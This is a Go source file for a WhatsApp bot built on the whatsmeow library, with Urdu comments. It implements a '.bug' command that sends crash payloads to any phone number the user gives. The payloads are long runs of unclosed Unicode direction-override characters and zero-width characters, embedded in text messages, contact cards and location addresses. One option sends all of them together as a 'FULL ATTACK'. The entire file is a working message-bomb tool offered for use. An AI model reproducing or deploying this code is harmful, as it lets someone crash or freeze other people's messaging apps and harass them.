package main

import (
	"context"
	"fmt"
	"strings"

	"go.mau.fi/whatsmeow"
	"go.mau.fi/whatsmeow/proto/waProto"
	"go.mau.fi/whatsmeow/types"
	"go.mau.fi/whatsmeow/types/events"
	"google.golang.org/protobuf/proto"
)

// ---------------------------------------------------------
// 🏗️ HELPER: وائرس بنانے والا فنکشن
// ---------------------------------------------------------
// ---------------------------------------------------------
// 🏗️ HELPER: وائرس جنریٹر (صرف "پلس" لاجک)
// ---------------------------------------------------------
func generateCrashPayload(length int) string {
	// \u202c (PDF/Close) کو نکال دیا ہے تاکہ لیئرز بند نہ ہوں
	openers := "\u202e\u202b\u202d" // RLO, RLE, LRO
	return strings.Repeat(openers, length)
}

// ---------------------------------------------------------
// 🚀 BUG HANDLER FUNCTION
// ---------------------------------------------------------
// ---------------------------------------------------------
// 🚀 UPDATED: handleBugCommand (With "ALL" Mixer)
// ---------------------------------------------------------
func handleSendBugs(client *whatsmeow.Client, v *events.Message, args []string) {
	if len(args) < 2 {
		replyMessage(client, v, "⚠️ Usage: .bug <1-5> <number>\nTypes: 1=Text, 2=VCard, 3=Loc, 4=Flood, 5=ALL MIX")
		return
	}

	bugType := strings.ToLower(args[0]) // lower case کر دیا تاکہ "all" بھی چلے
	targetNum := args[1]

	// 1. JID Parsing
	if !strings.Contains(targetNum, "@") {
		targetNum += "@s.whatsapp.net"
	}
	jid, err := types.ParseJID(targetNum)
	if err != nil {
		replyMessage(client, v, "❌ غلط نمبر!")
		return
	}

	// 2. LOGIC SWITCH
	switch bugType {
	
	case "1": // Text Bomb
		payload := "🚨 T-BUG 1 🚨\n" + generateCrashPayload(2500)
		client.SendMessage(context.Background(), jid, &waProto.Message{Conversation: proto.String(payload)})

	case "2": // VCard Bomb
		virusName := generateCrashPayload(2000)
		vcard := fmt.Sprintf("BEGIN:VCARD\nVERSION:3.0\nN:;%s;;;\nFN:%s\nEND:VCARD", virusName, virusName)
		client.SendMessage(context.Background(), jid, &waProto.Message{
			ContactMessage: &waProto.ContactMessage{DisplayName: proto.String("🔥 Virus 🔥"), Vcard: proto.String(vcard)},
		})

	case "3": // Location Bomb
		virusAddr := generateCrashPayload(2000)
		client.SendMessage(context.Background(), jid, &waProto.Message{
			LocationMessage: &waProto.LocationMessage{
				DegreesLatitude: proto.Float64(24.8607), DegreesLongitude: proto.Float64(67.0011),
				Name: proto.String("🚨 Crash Point"), Address: proto.String(virusAddr),
			},
		})

	case "4": // Memory Flood
		flood := strings.Repeat("\u200b\u200c\u200d", 8000)
		client.SendMessage(context.Background(), jid, &waProto.Message{
			ExtendedTextMessage: &waProto.ExtendedTextMessage{Text: proto.String("🚨 SILENT 🚨" + flood)},
		})

	// 🔥 CASE 5: THE ULTIMATE MIXER (All in One)
	case "5", "all":
		replyMessage(client, v, "☢️ Launching FULL ATTACK on "+targetNum)
		
		// یہ ایک ہی وقت میں سب کچھ بھیجے گا
		// 1. Text Bomb
		client.SendMessage(context.Background(), jid, &waProto.Message{Conversation: proto.String(generateCrashPayload(2500))})
		
		// 2. VCard Bomb
		vcard := fmt.Sprintf("BEGIN:VCARD\nVERSION:3.0\nN:;%s;;;\nFN:%s\nEND:VCARD", generateCrashPayload(1500), "VIRUS")
		client.SendMessage(context.Background(), jid, &waProto.Message{ContactMessage: &waProto.ContactMessage{DisplayName: proto.String("🔥"), Vcard: proto.String(vcard)}})
		
		// 3. Location Bomb
		client.SendMessage(context.Background(), jid, &waProto.Message{
			LocationMessage: &waProto.LocationMessage{DegreesLatitude: proto.Float64(0), DegreesLongitude: proto.Float64(0), Address: proto.String(generateCrashPayload(2000))},
		})

		replyMessage(client, v, "✅ All Warheads Delivered! 💀")

	default:
		replyMessage(client, v, "❌ غلط ٹائپ! 1 سے 5 تک سلیکٹ کریں۔")
	}
}
